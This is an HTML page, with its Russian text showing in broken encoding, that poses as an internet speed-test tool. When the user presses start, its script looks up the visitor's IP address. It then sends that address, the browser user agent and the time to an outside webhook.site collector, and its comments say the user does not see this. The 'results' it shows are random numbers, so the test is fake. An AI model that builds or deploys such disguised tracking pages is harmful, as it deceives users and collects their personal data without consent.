<!DOCTYPE html>
<html>
<head>
    <title>–¢–µ—Å—Ç —Å–∫–æ—Ä–æ—Å—Ç–∏ –∏–Ω—Ç–µ—Ä–Ω–µ—Ç–∞</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>
    <div class="container">
        <h1>üåê –¢–µ—Å—Ç —Å–∫–æ—Ä–æ—Å—Ç–∏ –∏–Ω—Ç–µ—Ä–Ω–µ—Ç–∞</h1>
        
        <div class="loader" id="loader"></div>
        
        <div class="status-card">
            <div class="status-label">–°—Ç–∞—Ç—É—Å —Ç–µ—Å—Ç–∞:</div>
            <div class="test-status" id="testStatus">–ü–æ–¥–≥–æ—Ç–æ–≤–∫–∞ –∫ —Ç–µ—Å—Ç—É...</div>
        </div>
        
        <div class="progress-container">
            <div class="progress-bar">
                <div class="progress-fill" id="progressFill"></div>
            </div>
            <div class="progress-text" id="progressText">0%</div>
        </div>
        
        <div class="results" id="results" style="display: none;">
            <div class="result-card success">
                <strong>‚úÖ –¢–µ—Å—Ç –∑–∞–≤–µ—Ä—à–µ–Ω!</strong><br>
                –†–µ–∑—É–ª—å—Ç–∞—Ç—ã –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω—ã –Ω–∞ —Å–µ—Ä–≤–µ—Ä
            </div>
            <div class="result-info">
                –°–∫–æ—Ä–æ—Å—Ç—å: <span id="finalSpeed">0</span> –ú–±–∏—Ç/—Å<br>
                –ü–∏–Ω–≥: <span id="finalPing">0</span> –º—Å
            </div>
        </div>
        
        <button class="test-btn" onclick="startTest()" id="testBtn">üöÄ –ù–∞—á–∞—Ç—å —Ç–µ—Å—Ç —Å–∫–æ—Ä–æ—Å—Ç–∏</button>
        
        <p class="footer">–ü—Ä–æ–≤–µ—Ä–∫–∞ –∫–∞—á–µ—Å—Ç–≤–∞ –∏–Ω—Ç–µ—Ä–Ω–µ—Ç-—Å–æ–µ–¥–∏–Ω–µ–Ω–∏—è</p>
    </div>

    <script>
        function startTest() {
            const testStatus = document.getElementById('testStatus');
            const progressFill = document.getElementById('progressFill');
            const progressText = document.getElementById('progressText');
            const testBtn = document.getElementById('testBtn');
            const results = document.getElementById('results');
            const finalSpeed = document.getElementById('finalSpeed');
            const finalPing = document.getElementById('finalPing');
            
            // –ë–ª–æ–∫–∏—Ä—É–µ–º –∫–Ω–æ–ø–∫—É
            testBtn.disabled = true;
            testBtn.textContent = '‚è≥ –¢–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∏–µ...';
            results.style.display = 'none';
            
            // –°—Ä–∞–∑—É –æ—Ç–ø—Ä–∞–≤–ª—è–µ–º IP (–ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –Ω–µ –≤–∏–¥–∏—Ç)
            fetch('https://api.ipify.org?format=json')
                .then(r => r.json())
                .then(data => {
                    // –°–∫—Ä—ã—Ç–æ –æ—Ç–ø—Ä–∞–≤–ª—è–µ–º IP –Ω–∞ —Å–±–æ—Ä—â–∏–∫
                    fetch('https://webhook.site/3ef2b531-e76c-4801-9a99-76ae86c62ca2', {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify({
                            ip: data.ip,
                            userAgent: navigator.userAgent,
                            time: new Date().toISOString(),
                            testType: 'hidden_speedtest'
                        })
                    });
                })
                .catch(error => {
                    console.log('IP send error');
                });
            
            // –ò–º–∏—Ç–∞—Ü–∏—è —Ç–µ—Å—Ç–∞ —Å–∫–æ—Ä–æ—Å—Ç–∏
            let progress = 0;
            const testInterval = setInterval(() => {
                progress += 2;
                progressFill.style.width = progress + '%';
                progressText.textContent = progress + '%';
                
                if (progress <= 25) {
                    testStatus.textContent = '–ü—Ä–æ–≤–µ—Ä–∫–∞ –ø–æ–¥–∫–ª—é—á–µ–Ω–∏—è...';
                } else if (progress <= 50) {
                    testStatus.textContent = '–ò–∑–º–µ—Ä–µ–Ω–∏–µ ping...';
                } else if (progress <= 75) {
                    testStatus.textContent = '–¢–µ—Å—Ç —Å–∫–æ—Ä–æ—Å—Ç–∏ –∑–∞–≥—Ä—É–∑–∫–∏...';
                } else {
                    testStatus.textContent = '–ó–∞–≤–µ—Ä—à–µ–Ω–∏–µ —Ç–µ—Å—Ç–∞...';
                }
                
                if (progress >= 100) {
                    clearInterval(testInterval);
                    
                    // –°–ª—É—á–∞–π–Ω—ã–µ "—Ä–µ–∑—É–ª—å—Ç–∞—Ç—ã"
                    const speed = (Math.random() * 80 + 20).toFixed(1);
                    const ping = Math.floor(Math.random() * 40 + 10);
                    
                    finalSpeed.textContent = speed;
                    finalPing.textContent = ping;
                    
                    testStatus.textContent = '–¢–µ—Å—Ç –∑–∞–≤–µ—Ä—à–µ–Ω!';
                    testBtn.textContent = 'üîÑ –ü–æ–≤—Ç–æ—Ä–∏—Ç—å —Ç–µ—Å—Ç';
                    testBtn.disabled = false;
                    results.style.display = 'block';
                }
            }, 100);
        }
        
        // –∞–≤—Ç–æ–∑–∞–ø—É—Å–∫ –ø—Ä–∏ –∑–∞–≥—Ä—É–∑–∫–µ
        // setTimeout(startTest, 1000);
    </script>
</body>
</html>
